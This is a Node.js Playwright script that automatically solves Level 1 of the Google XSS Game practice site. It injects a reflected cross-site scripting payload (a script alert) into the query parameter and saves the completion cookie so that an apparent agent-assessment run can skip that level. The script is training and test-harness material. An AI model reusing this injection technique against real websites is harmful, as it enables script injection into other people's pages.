#!/usr/bin/env node
/**
 * scripts/solve-xss-game-l1.js
 *
 * Standalone Playwright solver for Google XSS Game Level 1.
 * Used to pre-inject the L1 completion cookie into the default session
 * of an `ultimatrix assess` v3 run, so the agent can access Levels 2-6
 * without first needing to solve L1.
 *
 * L1 is a reflected XSS in `?query=` — the value is rendered directly
 * into the page. We inject a harmless `<script>alert('xss-game-l1-solved')</script>`,
 * auto-accept the dialog (which marks the level complete and sets the
 * `level1` cookie), then save Playwright storage state to disk.
 *
 * Output: ./.xss-game-l1-storage.json  (path can be overridden via --out)
 */
const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

const ARGS = process.argv.slice(2);
function getArg(name, fallback) {
  const flag = ARGS.find((a) => a.startsWith(`--${name}=`));
  return flag ? flag.split('=').slice(1).join('=') : fallback;
}

const PAYLOAD = getArg('payload', '<script>alert(\'xss-game-l1-solved\')</script>');
const TARGET  = getArg('target', 'https://xss-game.appspot.com/level1/frame');
const HEADLESS = !ARGS.includes('--headed');
const OUT_PATH = path.resolve(getArg('out', './.xss-game-l1-storage.json'));

(async () => {
  console.log(`[solve-l1] target = ${TARGET}`);
  console.log(`[solve-l1] payload = ${PAYLOAD}`);
  console.log(`[solve-l1] out     = ${OUT_PATH}`);
  console.log(`[solve-l1] headless= ${HEADLESS}`);

  const browser = await chromium.launch({ headless: HEADLESS });
  const context = await browser.newContext();
  const page = await context.newPage();

  let dialogText = null;
  let dialogHandled = false;
  page.on('dialog', async (dialog) => {
    dialogText = dialog.message();
    dialogHandled = true;
    console.log(`[solve-l1] dialog: ${dialog.type()}("${dialogText}")`);
    await dialog.accept();
  });

  const url = `${TARGET}?query=${encodeURIComponent(PAYLOAD)}`;
  console.log(`[solve-l1] GET ${url}`);

  try {
    await page.goto(url, { waitUntil: 'load', timeout: 15000 });
    await page.waitForTimeout(1500);
  } catch (e) {
    console.error(`[solve-l1] navigation failed: ${e.message}`);
  }

  const cookies = await context.cookies();
  console.log(`[solve-l1] cookies after L1: ${cookies.map((c) => c.name).join(', ')}`);

  const level1Cookie = cookies.find((c) => c.name === 'level1' || c.name === 'LEVEL_1_COMPLETE');
  if (level1Cookie) {
    console.log(`[solve-l1] ✓ L1 cookie present: ${level1Cookie.name}=${level1Cookie.value}`);
  } else {
    console.warn(`[solve-l1] ✗ No L1 cookie found. dialogHandled=${dialogHandled} dialogText=${dialogText}`);
  }

  const storageState = await context.storageState();
  fs.writeFileSync(OUT_PATH, JSON.stringify(storageState, null, 2));
  console.log(`[solve-l1] storage state saved (${storageState.cookies.length} cookies, ${(storageState.origins || []).length} origins)`);

  await context.close();
  await browser.close();
  process.exit(level1Cookie ? 0 : 1);
})();
